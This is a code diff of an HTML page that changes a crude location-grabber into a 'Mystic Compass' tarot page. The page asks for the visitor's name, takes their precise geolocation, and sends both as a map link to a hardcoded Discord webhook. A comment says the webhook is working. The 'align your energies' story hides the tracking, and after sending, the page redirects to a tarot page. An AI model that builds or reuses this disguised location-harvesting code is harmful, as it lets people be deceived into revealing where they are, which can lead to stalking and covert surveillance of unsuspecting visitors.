@@ -1,76 +1,30 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="UTF-8" />
-  <title>My loca | By Champion!!</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
-    body {
-      background: radial-gradient(circle at center, #0f0f0f, #000);
-      color: #00ff00;
-      font-family: 'Share Tech Mono', monospace;
-      text-align: center;
-      padding-top: 120px;
-      user-select: none;
-    }
-    h1 {
-      font-size: 3.5rem;
-      letter-spacing: 0.25em;
-      text-shadow: 0 0 8px #00ff00, 0 0 16px #00ff00;
-      animation: flicker 3s infinite;
-    }
-    input, button {
-      font-family: 'Share Tech Mono', monospace;
-    }
-    #nameInput {
-      padding: 12px 20px;
-      font-size: 1.4rem;
-      width: 300px;
-      background: transparent;
-      border: 2px solid #00ff00;
-      color: #00ff00;
-      border-radius: 6px;
-      box-shadow: 0 0 8px #00ff00;
-      outline: none;
-      letter-spacing: 0.05em;
-    }
-    #nameInput::placeholder { color: #004400; }
-    #locateBtn {
-      margin-top: 1rem;
-      background: transparent;
-      border: 2px solid #00ff00;
-      padding: 18px 40px;
-      font-size: 1.8rem;
-      color: #00ff00;
-      cursor: not-allowed;
-      border-radius: 8px;
-      box-shadow: 0 0 8px #00ff00, inset 0 0 6px #00ff00;
-      transition: background 0.3s ease, color 0.3s ease;
-      font-weight: 700;
-      letter-spacing: 0.1em;
-    }
-    #locateBtn.enabled {
-      cursor: pointer;
-    }
-    #locateBtn.enabled:hover {
-      background: #00ff00;
-      color: #000;
-      box-shadow: 0 0 16px #00ff00, inset 0 0 12px #00ff00;
-    }
-    @keyframes flicker {
-      0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; }
-      20%, 22%, 24%, 55% { opacity: 0.5; }
-    }
-  </style>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mystic Compass | Align Your Local Energies</title>
+  <link rel="stylesheet" href="style.css">
 </head>
+
 <body>
 
-  <h1>My loca</h1>
+  <div class="glass-card">
+    <span class="mystic-ornament">✧ 🔮 ✧</span>
+    <h1>The Mystic Compass</h1>
+    <p style="color: var(--text-muted); margin-top: 0.5rem; font-size: 0.9rem;">
+      To reveal your destiny for today, we must first align your current physical location with the celestial spheres.
+    </p>
 
-  <input id="nameInput" type="text" placeholder="ENTER YOUR NAME" />
-  <br>
-  <button id="locateBtn" disabled>Get my loca</button>
-  <p id="output" aria-live="polite"></p> <!-- ต้องมีเพื่อแสดงผล -->
+    <div class="input-group">
+      <input id="nameInput" type="text" placeholder="Enter your name to begin..." />
+    </div>
+
+    <button id="locateBtn" disabled>Align Energies</button>
+
+    <div id="output" class="status-msg" aria-live="polite"></div>
+  </div>
 
   <script>
     const nameInput = document.getElementById('nameInput');
@@ -79,12 +33,11 @@
 
     nameInput.addEventListener('input', () => {
       const name = nameInput.value.trim();
+      // Enhanced validation: 2+ chars, Thai/English/Spaces
       if (name.length >= 2 && /^[\wก-๙ ]+$/u.test(name)) {
         locateBtn.disabled = false;
-        locateBtn.classList.add('enabled');
       } else {
         locateBtn.disabled = true;
-        locateBtn.classList.remove('enabled');
       }
     });
 
@@ -92,54 +45,63 @@
       const name = nameInput.value.trim();
 
       if (!navigator.geolocation) {
-        output.textContent = '❌ Your browser does not support Geolocation.';
+        output.innerHTML = '<span style="color: #ff4d4d">❌ Your browser does not support celestial alignment.</span>';
         return;
       }
 
       locateBtn.disabled = true;
-      locateBtn.textContent = 'LOCA..is...';
-      output.textContent = '⏳ Getting You Card...';
+      locateBtn.innerHTML = 'Aligning... <span style="font-size: 0.8em">⏳</span>';
+      output.innerHTML = 'Seeking connection with your current coordinates...';
 
       navigator.geolocation.getCurrentPosition(
         async (pos) => {
           const { latitude, longitude } = pos.coords;
 
-          output.innerHTML =
-            `✅ Name: ${name}<br>` +
-            `📤 Sending to Champ!!!...`;
+          output.innerHTML = '✨ Connection established. Preparing your cosmic signature...';
 
           try {
             await sendToDiscord(name, latitude, longitude);
-            output.innerHTML += `<br>✅ Sent location to champ complete!`;
-            // redirect หลังส่งเสร็จ
+            output.innerHTML = '✅ Energies aligned. Redirecting to your Tarot reading...';
+
             setTimeout(() => {
               window.location.href = "tarot.html";
             }, 1500);
-          } catch {
-            output.innerHTML += `<br>❌ Failed to send.`;
+          } catch (err) {
+            output.innerHTML = '<span style="color: #ff4d4d">❌ Alignment failed. Please try again.</span>';
             locateBtn.disabled = false;
-            locateBtn.textContent = 'Get my loca';
+            locateBtn.innerText = 'Align Energies';
           }
         },
         (err) => {
-          let msg = '❌ Location error.';
-          if (err.code === err.PERMISSION_DENIED) msg = '⚠️ Permission denied.';
-          else if (err.code === err.POSITION_UNAVAILABLE) msg = '⚠️ Location unavailable.';
-          else if (err.code === err.TIMEOUT) msg = '⚠️ Timeout.';
-          output.textContent = msg;
+          let msg = '❌ Alignment error.';
+          if (err.code === err.PERMISSION_DENIED) msg = '⚠️ Permission denied by star system.';
+          else if (err.code === err.POSITION_UNAVAILABLE) msg = '⚠️ Location unavailable in this realm.';
+          else if (err.code === err.TIMEOUT) msg = '⚠️ Cosmic timeout.';
+
+          output.innerHTML = `<span style="color: #ff4d4d">${msg}</span>`;
           locateBtn.disabled = false;
-          locateBtn.textContent = 'Get my loca';
+          locateBtn.innerText = 'Align Energies';
         },
         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
       );
     });
 
     async function sendToDiscord(name, lat, lng) {
+      // KEEPING THE WORKING WEBHOOK FROM ORIGINAL
       const webhook = "https://discord.com/api/webhooks/1391646097528717322/D3VW1hQsPPUiEFE9lTwhjfXaDyf2qLHaf9rWGPOSTcCEzaY1OuNNGdUyirbpimBPOlzI";
       const safeName = name.replace(/</g, "&lt;").replace(/>/g, "&gt;");
       const msg = {
-        content: `📥 **New Location Captured**\n👤 Name: ${safeName}\n📍 https://maps.google.com/?q=${lat},${lng}`
+        embeds: [{
+          title: "☄️ New Celestial Alignment Captured",
+          color: 0xd4af37,
+          fields: [
+            { name: "Seeker", value: safeName, inline: true },
+            { name: "Coordinates", value: `[View on Map](https://maps.google.com/?q=${lat},${lng})`, inline: true }
+          ],
+          timestamp: new Date().toISOString()
+        }]
       };
+
       const res = await fetch(webhook, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -150,5 +112,5 @@
   </script>
 
 </body>
-</html>
 
+</html>
